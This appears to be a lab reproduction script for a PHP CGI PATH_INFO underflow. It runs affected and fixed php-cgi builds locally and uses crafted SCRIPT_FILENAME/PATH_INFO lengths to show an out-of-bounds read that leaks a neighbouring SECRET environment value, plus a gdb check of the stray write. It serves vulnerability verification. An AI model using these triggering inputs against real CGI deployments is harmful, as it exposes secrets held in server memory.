#!/usr/bin/env python3
"""CVE-2026-129538 / GHSA-5j3f-64r7-f564: CGI PATH_INFO correction underflow.

Loopback-only, no network server: invokes php-cgi directly with the vendor
regression's environment shapes (sapi/cgi/tests/ghsa-5j3f-64r7-f564.phpt in
the 8.5.13 tree).  The fix adds `pilen > slen` and a NULL check before
`env_path_info + pilen - slen`; when the stripped suffix is longer than
PATH_INFO, both the read at path_info[0] and the later CGI_PUTENV copy start
before the PATH_INFO environment string.

Usage: python3 lab/repro/php2shell-cve129538.py [OUTDIR]
Defaults to the pinned 8.5.12 (affected) and 8.5.13 (fixed) ASan CGI builds.
"""
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile

ROOT = pathlib.Path(__file__).resolve().parents[1]
BUILD = ROOT / 'build'
AFFECTED = BUILD / 'php-8.5.12-asan/sapi/cgi/php-cgi'
FIXED = BUILD / 'php-8.5.13-asan/sapi/cgi/php-cgi'
GDB = shutil.which('gdb')

TARGET_PHP = '''<?php
var_dump($_SERVER["PATH_INFO"] ?? null, $_SERVER["ORIG_PATH_INFO"] ?? null,
         getenv("SECRET"));
'''


def cgi(binary, target, env_extra):
    env = {
        'PATH': os.environ.get('PATH', '/usr/bin:/bin'),
        'REDIRECT_STATUS': '1',
        'REQUEST_METHOD': 'GET',
    }
    env.update(env_extra)
    env.update(ASAN_OPTIONS='detect_leaks=0:abort_on_error=1',
               UBSAN_OPTIONS='halt_on_error=1')
    cp = subprocess.run([str(binary), '-n', '-d', 'cgi.fix_pathinfo=1'],
                        env=env, capture_output=True, timeout=30)
    body = cp.stdout.decode(errors='replace').split('\r\n\r\n', 1)[-1]
    return cp.returncode, body, cp.stderr.decode(errors='replace')


def fields(body):
    """Return (PATH_INFO, ORIG_PATH_INFO, SECRET) as printed by var_dump."""
    lines = [x.strip() for x in body.strip().splitlines() if x.strip()]
    return tuple(x.split(' ', 1)[1] if ' ' in x else x for x in lines[:3])


def vendor_shapes(binary, target, log):
    shapes = {
        'short-suffix': {'SCRIPT_FILENAME': str(target) + '/b',
                         'PATH_INFO': '/a/b'},
        'long-suffix': {'SCRIPT_FILENAME': str(target) + '/xxxxxxxxxxxxxxxx',
                        'PATH_INFO': '/x'},
        'path-translated': {'SCRIPT_FILENAME': str(binary),
                            'PATH_TRANSLATED': str(target) + '/xxxxxxxxxxxxxxxx',
                            'REDIRECT_URL': '/redirected', 'PATH_INFO': '/x'},
    }
    out = {}
    for name, env in shapes.items():
        rc, body, err = cgi(binary, target, env)
        out[name] = fields(body)
        log.write('  %-15s rc=%d  PATH_INFO=%s ORIG=%s SECRET=%s\n' %
                  (name, rc, *out[name]))
        if err.strip():
            log.write('    stderr: ' + err.strip()[:500].replace('\n', ' / ') + '\n')
    return out


def sweep(binary, target, log):
    """Suffix length selects the out-of-bounds offset; SECRET is the neighbour."""
    result = {}
    for n in range(1, 21):
        rc, body, err = cgi(binary, target, {
            'SCRIPT_FILENAME': str(target) + '/' + 'x' * n,
            'SECRET': 'TOPSECRET0123456789',
            'PATH_INFO': '/x',
        })
        got = fields(body)[0]
        result[n] = got
        log.write('  n=%2d rc=%2d PATH_INFO=%s\n' % (n, rc, got))
        if err.strip():
            log.write('    stderr: ' + err.strip()[:500].replace('\n', ' / ') + '\n')
    return result


def gdb_write(binary, target, log):
    """Observe the NUL store at path_info[0] landing before the env value."""
    if not GDB:
        log.write('  gdb not installed: write side UNKNOWN in this run\n')
        return None
    script = '''set pagination off
set confirm off
break cgi_main.c:1294
run
printf "PTR %p ENV %p\\n", path_info, getenv("PATH_INFO")
printf "BEFORE %d\\n", *(unsigned char *)path_info
next
printf "AFTER %d\\n", *(unsigned char *)path_info
continue
'''
    env = {
        'PATH': os.environ.get('PATH', '/usr/bin:/bin'),
        'REDIRECT_STATUS': '1', 'REQUEST_METHOD': 'GET',
        'SCRIPT_FILENAME': str(target) + '/xxxxxxxxxxxxxxxx',
        'SECRET': 'TOPSECRET0123456789', 'PATH_INFO': '/x',
        'ASAN_OPTIONS': 'detect_leaks=0',
    }
    with tempfile.NamedTemporaryFile('w', suffix='.gdb', delete=False) as f:
        f.write(script)
        gdbfile = f.name
    try:
        cp = subprocess.run([GDB, '-batch', '-x', gdbfile, '--args',
                             str(binary), '-n', '-d', 'cgi.fix_pathinfo=1'],
                            env=env, capture_output=True, timeout=60)
    finally:
        os.unlink(gdbfile)
    text = cp.stdout.decode(errors='replace') + cp.stderr.decode(errors='replace')
    log.write('  gdb rc=%d\n' % cp.returncode)
    for line in text.splitlines():
        if line.startswith(('PTR ', 'BEFORE ', 'AFTER ')):
            log.write('  ' + line + '\n')
    return text
def main():
    out = pathlib.Path(sys.argv[1] if len(sys.argv) > 1 else
                       'lab/build/evidence/cve129538')
    out.mkdir(parents=True, exist_ok=True)
    tmp = pathlib.Path(tempfile.mkdtemp(prefix='cve129538-'))
    target = tmp / 'target.php'
    target.write_text(TARGET_PHP)
    report = out / 'verdict.txt'
    try:
        with report.open('w') as log:
            log.write('affected=%s\nfixed=%s\n' % (AFFECTED, FIXED))
            log.write('=== affected: vendor shapes ===\n')
            av = vendor_shapes(AFFECTED, target, log)
            log.write('=== fixed: vendor shapes ===\n')
            fv = vendor_shapes(FIXED, target, log)
            log.write('=== affected: suffix-length sweep ===\n')
            asw = sweep(AFFECTED, target, log)
            log.write('=== fixed: suffix-length sweep ===\n')
            fsw = sweep(FIXED, target, log)
            log.write('=== affected: GDB write observation ===\n')
            gt = gdb_write(AFFECTED, target, log)
            checks = {
                'affected long-suffix corrupted': av['long-suffix'][0] != '"/x"',
                'fixed long-suffix clean': fv['long-suffix'][0] == '"/x"',
                'affected path-translated corrupted':
                    av['path-translated'][0] != '"/x"',
                'fixed path-translated clean': fv['path-translated'][0] == '"/x"',
                'affected leaks SECRET tail at n=20':
                    asw[20] != '"/x"' and '23456789' in asw[20],
                'fixed clean for every n': all(v == '"/x"' for v in fsw.values()),
            }
            if gt is not None:
                checks['gdb write observed'] = ('BEFORE ' in gt and 'AFTER ' in gt)
            for name, ok in checks.items():
                log.write('%-40s %s\n' % (name, 'PASS' if ok else 'FAIL'))
            verdict = ('CONFIRMED' if all(checks.values()) else
                       'CONFIRMED_NO_GDB' if gt is None and all(
                           v for k, v in checks.items() if k != 'gdb write observed')
                       else 'INCONCLUSIVE')
            log.write('VERDICT: %s\n' % verdict)
        print(report.read_text())
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == '__main__':
    main()
